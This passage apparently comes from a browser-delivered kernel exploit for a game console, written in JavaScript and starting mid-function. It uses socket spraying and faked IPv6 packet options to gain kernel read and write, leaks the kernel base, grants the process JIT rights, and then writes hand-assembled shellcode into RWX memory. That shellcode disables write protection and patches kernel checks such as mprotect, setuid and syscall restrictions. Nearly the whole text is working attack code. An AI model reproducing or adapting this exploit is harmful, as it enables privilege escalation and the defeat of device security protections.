    //gib process jitty rights @thx kiwi for tip
    kernel_write8(targetpp.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF));
    kernel_write8(targetpp.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));
    //alert("jit enabled");
  }
  thr1();
  thr2();
  new_thr3.run();

  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
    if (p.read4(find_overlap_ptr.add32(0x4 * i)) == TAINT_CLASS) {
      overlapped_socket_idx = i;
      overlapped_socket = spray_socks[i];
      break;
    }
  }
  if (overlapped_socket == -1) {
    alert("failed to find overlapped socket, how even?");
    while (true) {}
  }


  //alert("fake 1");
  overlapped_socket_idx = fake_pktopts(0, TCLASS_MASTER);
  if (overlapped_socket_idx == -1) {
    alert("failed to fake pktopts 1");
    while (true) {}
  }
  overlapped_socket = leak_socks[overlapped_socket_idx];
  leak_socks[overlapped_socket_idx] = spare_sock;

  leak_address();

  chain.clear();
  for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
    chain.fcall(window.syscalls[105], leak_socks[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    chain.fcall(window.syscalls[105], leak_socks[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_class, 4);
  }
  chain.run();
  //alert("fake 2");
  overlapped_socket_idx = fake_pktopts(pktopts_leak_addr.add32(PKTOPTS_PKTINFO_OFFSET), TCLASS_MASTER2);
  if (overlapped_socket_idx == -1) {
    alert("failed to fake pktopts 2");
    while (true) {}
  }
  overlapped_socket = leak_socks[overlapped_socket_idx];
  //alert("overlapped socket 3 = " + overlapped_socket + "indx (" + overlapped_socket_idx);
  //find slave
  find_victim();
  var knote_addr = kernel_read8(kevent_leak_addr.add32(kevent_sock * 0x8));
  //alert("knote_addr = 0x" + knote_addr);


  var knote_kn = kernel_read8(knote_addr.add32(KNOTE_KN_OFFSET));
  //alert("knote_kn = 0x" + knote_kn);
  var socketops_ptr = kernel_read8(knote_kn.add32(0x8));
  kernel_base = socketops_ptr.sub32(KERNEL_SOCKETOPS_OFFSET);
  //alert("kernel_base = 0x" + kernel_base);

  //r8 of ioctl handler == thread*
  //use gadget that returns thread*
  //syscall handler will return lower 4 bytes
  //read errno to get 4 bytes
  //use heap hi dword to create the thread*
  p.write8(fake_sockopts.add32(0x18), window.gadgets["mov rax, r8"]);
  kernel_write8(knote_kn.add32(0x8), fake_sockopts);
  //alert("executing gadget");
  var ssysret = p.syscall(54, kevent_sock, 0x20001111, 0);
  var lowwer = p.read8(errno_location);
  //alert("ssysret= 0x" + ssysret + "\r\nerrno = 0x" + lowwer);
  var this_thread_ptr = new int64(lowwer.low, pktopts_leak_addr.hi);
  //alert("target thread = 0x" + this_thread_ptr);
  var target_ucred = kernel_read8(this_thread_ptr.add32(0x130));
  jit_me_proc(target_ucred);

  //create jit mem
  var exec_handle = p.syscall(533, 0, 0x100000, 7);
  var write_handle = p.syscall(534, exec_handle, 3);
  var write_address = p.syscall(477, new int64(0x91000000, 0x9), 0x100000, 3, 17, write_handle, 0);
  var exec_address = p.syscall(477, new int64(0x90000000, 0x9), 0x100000, 0x5, 1, exec_handle, 0)
  p.syscall(324, 1);
  if (exec_address.low != 0x90000000) {
    alert("failed to allocate rwx memory");
  }

  var this_proc_ptr = kernel_read8(this_thread_ptr.add32(0x8));
  var this_p_fd_ptr = kernel_read8(this_proc_ptr.add32(0x48));
  var this_fd_ofiles_ptr = kernel_read8(this_p_fd_ptr.add32(0x0));

  var this_master_sock_file = kernel_read8(this_fd_ofiles_ptr.add32(0x8 * master_sock));
  var this_overlapped_socket_file = kernel_read8(this_fd_ofiles_ptr.add32(0x8 * overlapped_socket));

  var this_master_sock_file_data = kernel_read8(this_master_sock_file);
  var this_overlapped_socket_file_data = kernel_read8(this_overlapped_socket_file);

  var this_master_sock_pcb = kernel_read8(this_master_sock_file_data.add32(0x18));
  var this_overlapped_socket_pcb = kernel_read8(this_overlapped_socket_file_data.add32(0x18));

  var this_master_sock_pktopts_address = kernel_read8(this_master_sock_pcb.add32(0x118));
  var this_overlapped_socket_pktopts_address = kernel_read8(this_overlapped_socket_pcb.add32(0x118));

  /*
      mov rdi, 0xAAAAAAAAAAAAAAAA //master pktinfo
      mov qword ptr [rdi], 0
      mov rdi, 0xAAAAAAAAAAAAAAAA //overlap rthdr
      mov qword ptr [rdi], 0
      mov rdi, 0xAAAAAAAAAAAAAAAA //slave pktinfo
      mov qword ptr [rdi], 0
      mov rdi, 0xAAAAAAAAAAAAAAAA //sockopts ptr field
      mov rsi, 0xAAAAAAAAAAAAAAAA //original sockopts
      mov qword ptr [rdi], rsi

      mov rdi, 0xAAAAAAAAAAAAAAAA //kernel base
      //disable wp
      mov rax, cr0
      and rax, 0xFFFFFFFFFFFEFFFF
      mov cr0, rax

      //mprotect
      //FFFFFFFF96DDFC08 6x 90
      mov dword ptr [rdi + 0x1a3c08], 0x90909090
      mov word ptr [rdi + 0x1a3c0c], 0x9090
      //setuid
      //FFFFFFFF96C90A72    B8 00 00 00 00
      mov dword ptr [rdi + 0x54a72], 0x000000B8
      mov byte ptr [rdi + 0x54a76], 0x00
      //syscall everywhere
      //FFFFFFFF96C3C493    00 00 00 00
      //FFFFFFFF96C3C4B1    EB 7D
      mov dword ptr [rdi + 0x493], 0x00000000
      mov word ptr [rdi + 0x4b1], 0x7DEB
      //rwx mmap
      //FFFFFFFF96D79620 37
      //FFFFFFFF96D79623 37
      mov byte ptr [rdi + 0x13d620], 0x37
      mov byte ptr [rdi + 0x13d623], 0x37
      //dlsym
      //FFFFFFFF96E73F3A    e9 c1 01 00 00
      //FFFFFFFF96EEE620    31 C0 C3
      mov dword ptr [rdi + 0x237f3a], 0x0001C1E9
      mov byte ptr [rdi + 0x237f3e], 0x00
      //syscall 11
      //FFFFFFFF97CB8820    02 00 00 00 00 00 00 00
      //FFFFFFFF97CB8828    0xFFFFFFFF96C4F460
      //FFFFFFFF97CB8848    00 00 00 00 01 00 00 00

      mov qword ptr[rdi + 0x107c820], 0x0000000000000002
      mov rsi, 0x13460
      add rsi, rdi
      mov qword ptr[rdi + 0x107c828], rsi
      mov rsi, 0x0000000100000000
      mov qword ptr[rdi + 0x107c848], rsi

      //enable wp
      or rax, 0x10000
      mov cr0, rax
      xor eax, eax
      ret
  */

  var exec_writer = p.arrayFromAddress(write_address);

  for (var i = 0; i < 0x100; i++) {
    exec_writer[i] = 0x90909090;
  }
  exec_writer[0x100] = 0x37C0C748;
  exec_writer[0x101] = 0xC3000013;

  var jitt = p.fcall(exec_address);
  if (jitt.low != 0x1337) {
    alert("failed jit test = 0x" + jitt);
  }

  exec_writer[0] = 0xAAAABF48;
  exec_writer[1] = 0xAAAAAAAA;
  exec_writer[2] = 0xC748AAAA;
  exec_writer[3] = 0x00000007;
  exec_writer[4] = 0xAABF4800;
  exec_writer[5] = 0xAAAAAAAA;
  exec_writer[6] = 0x48AAAAAA;
  exec_writer[7] = 0x000007C7;
  exec_writer[8] = 0xBF480000;
  exec_writer[9] = 0xAAAAAAAA;
  exec_writer[10] = 0xAAAAAAAA;
  exec_writer[11] = 0x0007C748;
  exec_writer[12] = 0x48000000;
  exec_writer[13] = 0xAAAAAABF;
  exec_writer[14] = 0xAAAAAAAA;
  exec_writer[15] = 0xAABE48AA;
  exec_writer[16] = 0xAAAAAAAA;
  exec_writer[17] = 0x48AAAAAA;
  exec_writer[18] = 0xBF483789;
  exec_writer[19] = 0xAAAAAAAA;
  exec_writer[20] = 0xAAAAAAAA;
  exec_writer[21] = 0x48C0200F;
  exec_writer[22] = 0xFEFFFF25;
  exec_writer[23] = 0xC0220FFF;
  exec_writer[24] = 0x3C0887C7;
  exec_writer[25] = 0x9090001A;
  exec_writer[26] = 0xC7669090;
  exec_writer[27] = 0x1A3C0C87;
  exec_writer[28] = 0xC7909000;
  exec_writer[29] = 0x054A7287;
  exec_writer[30] = 0x0000B800;
  exec_writer[31] = 0x7687C600;
  exec_writer[32] = 0x0000054A;
  exec_writer[33] = 0x049387C7;
  exec_writer[34] = 0x00000000;
  exec_writer[35] = 0xC7660000;
  exec_writer[36] = 0x0004B187;
  exec_writer[37] = 0xC67DEB00;
  exec_writer[38] = 0x13D62087;
  exec_writer[39] = 0x87C63700;
  exec_writer[40] = 0x0013D623;
  exec_writer[41] = 0x3A87C737;
  exec_writer[42] = 0xE900237F;
  exec_writer[43] = 0xC60001C1;
  exec_writer[44] = 0x237F3E87;
  exec_writer[45] = 0xC7480000;
  exec_writer[46] = 0x07C82087;
  exec_writer[47] = 0x00000201;
  exec_writer[48] = 0xC6C74800;
  exec_writer[49] = 0x00013460;
  exec_writer[50] = 0x48FE0148;
  exec_writer[51] = 0xC828B789;
  exec_writer[52] = 0xBE480107;
  exec_writer[53] = 0x00000000;
  exec_writer[54] = 0x00000001;
  exec_writer[55] = 0x48B78948;
  exec_writer[56] = 0x480107C8;
  exec_writer[57] = 0x0100000D;
  exec_writer[58] = 0xC0220F00;
  exec_writer[59] = 0x8080B848;
  exec_writer[60] = 0x00008080;
  exec_writer[61] = 0x90C30000;


  p.write8(write_address.add32(0x2), this_master_sock_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
  p.write8(write_address.add32(0x13), this_overlapped_socket_pktopts_address.add32(PKTOPTS_RTHDR_OFFSET));
  p.write8(write_address.add32(0x24), pktopts_leak_addr.add32(PKTOPTS_PKTINFO_OFFSET));
  p.write8(write_address.add32(0x35), knote_kn.add32(0x8));
  p.write8(write_address.add32(0x3F), socketops_ptr);
  p.write8(write_address.add32(0x4C), kernel_base);

  p.write8(fake_sockopts.add32(0x18), exec_address);
  //alert("kernel payload");
  p.syscall(54, kevent_sock, 0x20001111, 0);
  //alert("survived kernel hell, all is ok? 0x" + p.read8(errno_location)); //0x80808080
  //p.syscall(325);
  p.write8(0, 0); //kill browser
  while (true) {}

}